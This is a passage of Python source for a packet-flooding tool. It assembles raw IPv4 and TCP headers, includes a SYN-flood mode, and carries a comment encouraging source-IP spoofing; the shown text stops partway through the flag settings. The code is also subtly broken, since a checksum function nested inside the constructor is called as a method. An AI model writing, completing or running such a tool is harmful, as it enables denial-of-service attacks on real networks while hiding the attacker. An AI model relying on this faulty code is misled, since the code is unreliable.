from socket import *
from struct import *
import sys
import argparse
import time
import threading
from queue import Queue
from services import services

class FloodPacketAssembler:
    def __init__(self, src_ip, dest_ip, dest_port, method):
        #packet
        self.ip_final_header = b""
        self.tcp_header = b""
        self.packet = b""

        def calc_checksum(self, msg):  # complement sum of all 16-bit words in the header
            s = 0
        # loop taking 2 step characters at a time
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + msg[i + 1]  # 16-bit words
                s = s + w

            s = (s >> 16) + (s & 0xffff)  # carry check and correction can be performed after all additions.
            s = s + (s >> 16)  # if another carry is generated by this addition, another 1 must be added to the sum
            s = ~s & 0xffff  # complement and mask to 4 byte short
            return s

        #ip header fields
        self.ip_ver = 4  # four-bit version field. For IPv4, this is always equal to 4.
        self.ip_ihl = 5  # 4 bits that specify the size of the IPv4 header (the number of 32-bit words in the header)
        self.ip_ver_ihl = (self.ip_ver << 4) + self.ip_ihl
        self.ip_tos = 0
        self.ip_total_len = (20 + 20)  # kernel will fill the correct total length
        self.ip_id = 54321  # uniquely identifying the group of fragments of a single IP datagram.
        self.ip_frag_flag_off = 0
        self.ip_ttl = 255
        self.ip_protocol = IPPROTO_TCP
        self.ip_header_checksum_placeholder = 0  # kernel will fill the correct checksum
        # inet_aton(...) -> Convert an IPv4 address from dotted-quad string format to 32-bit packed binary format
        self.ip_src_ip = inet_aton(src_ip)  # Spoof the source ip address if you want to
        self.ip_dst_ip = inet_aton(dest_ip)
        # the ! in the pack format string means network byte order (big-endian)
        self.ip_tmp_header = pack('! B B H H H B B H 4s 4s', self.ip_ver_ihl, self.ip_tos, self.ip_total_len,
                                  self.ip_id, self.ip_frag_flag_off, self.ip_ttl, self.ip_protocol,
                                  self.ip_header_checksum_placeholder, self.ip_src_ip, self.ip_dst_ip)

        self.ip_final_header = pack('! B B H H H B B H 4s 4s', self.ip_ver_ihl, self.ip_tos, self.ip_total_len,
                                    self.ip_id, self.ip_frag_flag_off, self.ip_ttl, self.ip_protocol,
                                    self.calc_checksum(self.ip_tmp_header), self.ip_src_ip, self.ip_dst_ip)


        # tcp header fields
        self.tcp_src_port = 1234
        self.tcp_dst_port = dest_port
        self.tcp_seq_bytenum = 0
        self.tcp_ack_bytenum = 0
        # the size of the TCP header in 32-bit words. min=5 words(20 Bytes) , max=15 words(60 Bytes)
        self.tcp_dataoffset = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        self.tcp_dataoffset_reserved_ns = (self.tcp_dataoffset << 4) + 0
        # tcp flags
        self.tcp_cwr = 0
        self.tcp_ece = 0
        self.tcp_urg = 0
        self.tcp_psh = 0
        self.tcp_rst = 0
        # 1 - SYN flood
        if (method == 1):
            self.tcp_ack = 0
            self.tcp_syn = 1
            self.tcp_fin = 0
        